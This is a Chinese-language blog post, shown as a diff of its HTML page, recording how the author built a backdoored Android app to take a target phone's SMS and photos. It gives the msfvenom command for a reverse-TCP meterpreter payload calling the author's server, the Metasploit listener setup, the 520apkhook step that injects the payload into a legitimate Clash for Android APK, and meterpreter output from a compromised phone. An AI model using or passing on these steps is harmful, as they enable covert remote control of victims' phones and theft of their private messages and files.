@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jerrychan807.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Pre: 需求:给一个目标安卓手机植入后门app,以获取其短信、相册等信息。 整体思路:   服务器安装并运行msf框架,开启监听   使用520apkhook注入一个干净的apk,生成新的apk   目标手机安装修改后的apk,打开app后,肉鸡能够上线   centos7运行msf框架: 安装msf: 参考文章:   centos安装msf   Centos 7.6安装MetaSploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DevRecord-AndroidBackdoorApp">
+<meta property="og:url" content="https://jerrychan807.github.io/2023/3464.html">
+<meta property="og:site_name" content="Trash Bin">
+<meta property="og:description" content="Pre: 需求:给一个目标安卓手机植入后门app,以获取其短信、相册等信息。 整体思路:   服务器安装并运行msf框架,开启监听   使用520apkhook注入一个干净的apk,生成新的apk   目标手机安装修改后的apk,打开app后,肉鸡能够上线   centos7运行msf框架: 安装msf: 参考文章:   centos安装msf   Centos 7.6安装MetaSploit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150435.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150534.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150819.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223160745.png">
+<meta property="article:published_time" content="2023-12-23T06:00:34.000Z">
+<meta property="article:modified_time" content="2023-12-23T08:24:48.782Z">
+<meta property="article:author" content="Foolisheddy">
+<meta property="article:tag" content="DevRecord">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150435.png">
+
+<link rel="canonical" href="https://jerrychan807.github.io/2023/3464.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DevRecord-AndroidBackdoorApp | Trash Bin</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Trash Bin</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jerrychan807.github.io/2023/3464.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+      <meta itemprop="name" content="Foolisheddy">
+      <meta itemprop="description" content="温故而知新">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trash Bin">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DevRecord-AndroidBackdoorApp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-12-23 14:00:34 / Modified: 16:24:48" itemprop="dateCreated datePublished" datetime="2023-12-23T14:00:34+08:00">2023-12-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DevRecord/" itemprop="url" rel="index"><span itemprop="name">DevRecord</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1>Pre:</h1>
+<p>需求:给一个目标安卓手机植入后门app,以获取其短信、相册等信息。</p>
+<h1>整体思路:</h1>
+<ol>
+<li class="lvl-3">
+<p>服务器安装并运行msf框架,开启监听</p>
+</li>
+<li class="lvl-3">
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/ba0gu0/520apkhook?tab=readme-ov-file">520apkhook</a>注入一个干净的apk,生成新的apk</p>
+</li>
+<li class="lvl-3">
+<p>目标手机安装修改后的apk,打开app后,肉鸡能够上线</p>
+</li>
+</ol>
+<h1>centos7运行msf框架:</h1>
+<h2 id="安装msf">安装msf:</h2>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/126773677">Centos 7.6安装MetaSploit</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">metasploit官方文档</a></p>
+</li>
+</ul>
+<p>msf快速安装命令:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
+<p>快速安装脚本报错,需要修改yum的一些配置:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line">vim /usr/bin/yum</span><br><span class="line"></span><br><span class="line">python -&gt; python2</span><br></pre></td></tr></table></figure>
+<p>报错解决参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/11213520/yum-crashed-with-keyboard-interrupt-error">Yum crashed with Keyboard Interrupt error</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/524552/upgraded-python-and-now-i-cant-run-yum-upgrade">Upgraded Python, and now I can’t run “yum upgrade”</a></p>
+</li>
+</ul>
+<h2 id="安装Postgresql">安装Postgresql:</h2>
+<p>一开始直接用yum安装了PostgreSQL 9.2几的版本,发现和安装的msf不兼容。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[-] Error <span class="keyword">while</span> running <span class="built_in">command</span> db_status: Your version of PostgreSQL (90224) is too old. Active Record supports PostgreSQL &gt;= 9.3.</span><br></pre></td></tr></table></figure>
+<p>后来选择重新安装psql11版本的。参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lfxx/p/17616078.html">Centos7 安装 postgresql-11</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kerrycode/p/14324465.html">PostgreSQL忘记postgres账号的密码怎么办？</a></p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装</span></span><br><span class="line">yum install postgresql11 postgresql11-devel postgresql11-libs postgresql11-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/pgsql-11/bin:<span class="variable">$PATH</span></span><br><span class="line">/usr/pgsql-11/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统启动配置</span></span><br><span class="line">systemctl start postgresql-11</span><br><span class="line">systemctl restart postgresql-11</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忘记密码,可以在配置文件里设置为trust后进入psql</span></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /var/lib/pgsql/11/data/pg_hba.conf</span><br></pre></td></tr></table></figure>
+<p>配置msf连接psql:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /opt/metasploit-framework/embedded/framework/config/database.yml.example /opt/metasploit-framework/embedded/framework/config/database.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给msf创建psql用户</span></span><br><span class="line">ALTER USER postgres WITH PASSWORD <span class="string">&#x27;msf&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://www.codenong.com/6790088/">关于linux：Postgresql -bash：psql：找不到命令</a></p>
+</li>
+</ul>
+<h1>安装jdk11:</h1>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qqq1994_0810/article/details/128196328">centos7两种方式安装jdk11</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lzllzllzlzz/article/details/118998187">centos7更换jdk版本不生效解决办法</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ww1984/p/15934103.html">jdk8与jdk11在centos7下的安装</a></p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改环境变量,替换原来的jdk1.8</span></span><br><span class="line">vim /etc/profile.d/jdk11.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向文件中添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/java-11-openjdk-11.0.21.0.9-1.el7_9.x86_64</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<h1>注入apk:</h1>
+<p>使用该github项目: <a target="_blank" rel="noopener" href="https://github.com/ba0gu0/520apkhook">https://github.com/ba0gu0/520apkhook</a></p>
+<p>下载一个干净的<a target="_blank" rel="noopener" href="https://dl.jichangzhu.com/clients/clash_for_android/releases/latest/">apk</a>:</p>
+<ol>
+<li class="lvl-3">
+<p>下载Releases中打包好的jar包</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/ba0gu0/520apkhook/releases">https://github.com/ba0gu0/520apkhook/releases</a></p>
+<ol start="2">
+<li class="lvl-3">
+<p>msfmsfvenom:</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=服务器ip lport=3306 -o ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自己的</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=74.48.x.x lport=10001 -o /jhack/cfa-2.5.12-premium-universal-release.apk </span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li class="lvl-3">
+<p>启动msfconsole</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 10001</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150435.png" alt="20231223150435" /></p>
+<ol start="4">
+<li class="lvl-3">
+<p>520ApkHook:</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方教程:</span></span><br><span class="line">java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos7:</span></span><br><span class="line">java -jar a520ApkHook-1.1-jar-with-dependencies.jar /jhack/ClashForAndroid\ 2.5.12.apk /jhack/NewClashForAndroid.apk</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150534.png" alt="20231223150534" /><br />
+<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150819.png" alt="20231223150819" /></p>
+<ol>
+<li class="lvl-3">
+<p>520ApkHook工具会生成出一个修改好的pk</p>
+</li>
+</ol>
+<h1>目标安卓手机运行后门app:</h1>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223160745.png" alt="20231223160745" /><br />
+目标安卓手机安装apk,并运行app.肉鸡上线成功。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取目标手机系统信息</span></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : localhost</span><br><span class="line">OS              : Android 10 - Linux 4.14.116 (aarch64)</span><br><span class="line">Architecture    : aarch64</span><br><span class="line">System Language : zh_CN_<span class="comment">#Hans</span></span><br><span class="line">Meterpreter     : dalvik/android</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取应用列表</span></span><br><span class="line">meterpreter &gt; app_list</span><br><span class="line">Application List</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">Name                                     Package                                   Running  IsSystem</span><br><span class="line">----                                     -------                                   -------  --------</span><br><span class="line">ARCore                                   com.google.ar.core                        <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AREngineServer                           com.huawei.arengine.service               <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AirLink                                  com.huawei.airlink                        <span class="literal">false</span>    <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>更多的msf利用命令可参考:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://iyouport.substack.com/p/-metasploitandroid17">尝试 Metasploit入侵Android移动设备：黑客主义行动力（17）</a></p>
+</li>
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74914256/article/details/130502678">Kali Linux利用MSF入侵安卓手机(零基础版超详细)</a></p>
+</li>
+</ul>
+<p>测试结果:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>华为p30 harmonyos 3.0  成功</p>
+</li>
+<li class="lvl-2">
+<p>华为p40 harmonyos 4.0  系统版本号5.10.43  失败</p>
+</li>
+</ul>
+<h1>Refs:</h1>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a target="_blank" rel="noopener" href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">Related Posts</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/2022/44900.html" rel="bookmark">DevRecord-BNBSmartChain私有链初步搭建</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/2022/13133.html" rel="bookmark">DevRecord-BlockScout区块链浏览器初步搭建</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/2022/37144.html" rel="bookmark">DevRecord-Sui节点搭建和验证节点申请</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/2022/11477.html" rel="bookmark">DevRecord-部署vue前端到Vervel上</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/2022/57835.html" rel="bookmark">DevRecord-TradingView技术分析指标API</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/DevRecord/" rel="tag"># DevRecord</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/33827.html" rel="prev" title="StudyRecord-使用Python转账monero">
+      <i class="fa fa-chevron-left"></i> StudyRecord-使用Python转账monero
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+<script src="https://utteranc.es/client.js"
+        repo="jerrychan807/blog-comment"
+        issue-term="pathname"
+        theme="github-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+    
+
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Pre:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">整体思路:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">centos7运行msf框架:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85msf"><span class="nav-number">3.1.</span> <span class="nav-text">安装msf:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Postgresql"><span class="nav-number">3.2.</span> <span class="nav-text">安装Postgresql:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">安装jdk11:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">注入apk:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">目标安卓手机运行后门app:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">Refs:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Foolisheddy"
+      src="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+  <p class="site-author-name" itemprop="name">Foolisheddy</p>
+  <div class="site-description" itemprop="description">温故而知新</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">138</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jerrychan807" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jerrychan807" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:529883409@qq.com" title="E-Mail → mailto:529883409@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Foolisheddy</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">863k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">13:04</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
